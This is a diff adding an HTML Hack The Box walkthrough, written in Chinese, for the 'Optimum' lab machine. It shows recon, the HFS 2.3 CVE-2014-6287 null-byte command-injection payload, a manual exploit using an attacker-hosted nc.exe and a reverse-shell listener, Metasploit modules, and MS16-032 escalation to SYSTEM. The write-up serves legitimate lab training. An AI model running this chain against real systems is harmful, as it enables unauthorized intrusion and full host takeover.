@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>HTB Optimum — 完整攻略</title><link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&family=Noto+Sans+SC:wght@400;500;600;700&display=swap" rel="stylesheet"><style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Noto Sans SC','Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.blue{background:#1e3a5f;color:var(--blue)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-blue{background:#1e3a5f;color:var(--blue)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style></head>
+<body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><div style="font-size:2.4rem;margin-bottom:.3rem;">⚡</div><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='optimum'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-op','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}}if(sessionStorage.getItem('htb-auth-op')==='1')document.getElementById('gate').style.display='none';</script>
+
+<header class="hero"><div class="hero-inner"><div class="hero-label">Hack The Box — 完整攻略</div><h1><span>Optimum</span></h1><div class="hero-meta"><span>OS <strong>Windows Server 2012 R2</strong></span><span>难度 <strong>Easy</strong></span><span>端口 <strong>80</strong></span><span>作者 <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
+<div class="chain"><div class="chain-inner"><span class="chain-node green">HFS 2.3 CVE-2014-6287 空字节注入 RCE</span><span class="chain-arrow">→</span><span class="chain-node red">migrate x64 → MS16-032 Secondary Logon → SYSTEM</span></div></div>
+
+<main class="content">
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>信息收集</h2></div>
+<pre><code><span class="cmd">$ nmap -sC -sV -p- --min-rate 10000 10.129.44.44</span>
+<span class="output">PORT   STATE SERVICE VERSION
+<span class="highlight">80/tcp open  http    HttpFileServer httpd 2.3</span></span></code></pre>
+<p>只有一个 80 端口，运行 <strong>Rejetto HttpFileServer 2.3</strong>。</p>
+
+<div class="phase"><div class="phase-number green">Phase 1</div><h2>立足点：HFS 空字节注入 RCE</h2></div>
+
+<div class="callout callout-key"><span class="callout-label">🧒 儿童版 — 搜索框塞空字节</span>这个文件服务器有一个搜索框。如果你在搜索内容前面塞一个"隐形字符"（空字节 <code>%00</code>），后面跟上系统命令 <code>{.exec|命令.}</code>，服务器就会把你的命令当成内部指令执行。</div>
+
+<h3>Metasploit</h3>
+<pre><code><span class="cmd">msf6> use exploit/windows/http/rejetto_hfs_exec</span>
+<span class="cmd">msf6> set RHOSTS 10.129.44.44</span>
+<span class="cmd">msf6> set LHOST &lt;攻击机IP&gt;</span>
+<span class="cmd">msf6> exploit</span>
+<span class="output">meterpreter > getuid</span>
+<span class="output">Server username: OPTIMUM\<span class="highlight">kostas</span></span></code></pre>
+
+<h3>手动方法</h3>
+<pre><code><span class="cmd">$ searchsploit -m windows/remote/39161.py</span>
+<span class="comment"># 修改 ip_addr 和 local_port，准备 nc.exe</span>
+<span class="cmd">$ python3 -m http.server 80</span>
+<span class="cmd">$ nc -nlvp 443</span>
+<span class="cmd">$ python3 39161.py 10.129.44.44 80</span>
+<span class="comment"># 可能需要多次运行</span></code></pre>
+
+<div class="phase"><div class="phase-number red">Phase 2</div><h2>权限提升：MS16-032</h2></div>
+
+<h3>迁移到 x64 进程（必须！）</h3>
+<pre><code><span class="cmd">meterpreter > sysinfo</span>
+<span class="output">Architecture : x64
+Meterpreter  : <span class="important">x86/windows</span>  ← 需要迁移</span>
+
+<span class="cmd">meterpreter > ps</span>
+<span class="comment"># 找一个 x64 进程的 PID（如 explorer.exe）</span>
+<span class="cmd">meterpreter > migrate 1860</span>
+<span class="output">Meterpreter : <span class="highlight">x64/windows</span>  ← 迁移成功</span></code></pre>
+
+<div class="callout callout-key"><span class="callout-label">🧒 儿童版 — 小钥匙变大钥匙</span>拿到的是 32 位的小钥匙，但保险箱的锁孔是 64 位的大锁。必须先 <code>migrate</code> 到一个 x64 进程"变形"成大钥匙，才能继续开锁。</div>
+
+<h3>MS16-032 Secondary Logon 提权</h3>
+
+<div class="callout callout-why"><span class="callout-label">漏洞原理</span>Windows Secondary Logon 服务在创建新进程时没有正确清理标准句柄。攻击者通过竞态条件劫持这些句柄，在 SYSTEM 权限的进程上下文中执行任意代码。</div>
+
+<pre><code><span class="cmd">meterpreter > background</span>
+<span class="cmd">msf6> use exploit/windows/local/ms16_032_secondary_logon_handle_privesc</span>
+<span class="cmd">msf6> set SESSION 1</span>
+<span class="cmd">msf6> set LHOST &lt;攻击机IP&gt;</span>
+<span class="cmd">msf6> exploit</span>
+
+<span class="cmd">meterpreter > getuid</span>
+<span class="output">Server username: <span class="highlight">NT AUTHORITY\SYSTEM</span></span></code></pre>
+
+<div class="callout callout-warn"><span class="callout-label">踩坑提醒</span><strong>必须先 migrate 到 x64 进程</strong>，否则 MS16-032 会因架构不匹配失败。MS16-032 要求目标有 2 个以上 CPU 核心（HTB 满足）。</div>
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">附录</div><h2>知识点总结</h2></div>
+<div class="takeaway">
+<div class="takeaway-item"><strong>HFS 2.3 CVE-2014-6287。</strong><p>搜索参数中注入 <code>%00{.exec|命令.}</code>。HFS 的模板脚本语言 <code>{.命令.}</code> 类似 SSTI。</p></div>
+<div class="takeaway-item"><strong>x86 → x64 迁移是 Windows 提权的前置条件。</strong><p>很多内核提权模块需要 64 位 Native API。用 <code>migrate</code> 到 explorer.exe 或 svchost.exe。</p></div>
+<div class="takeaway-item"><strong>MS16-032 Secondary Logon 句柄泄露。</strong><p>竞态条件劫持 SYSTEM 句柄。需要 2+ CPU 核心。</p></div>
+</div>
+<div class="diagram"><span class="node node-green">HFS 2.3 空字节注入</span><span class="arrow">→</span><span class="node node-red">migrate x64 → MS16-032 → SYSTEM</span></div>
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Optimum Writeup · 2026</footer>
+</body></html>
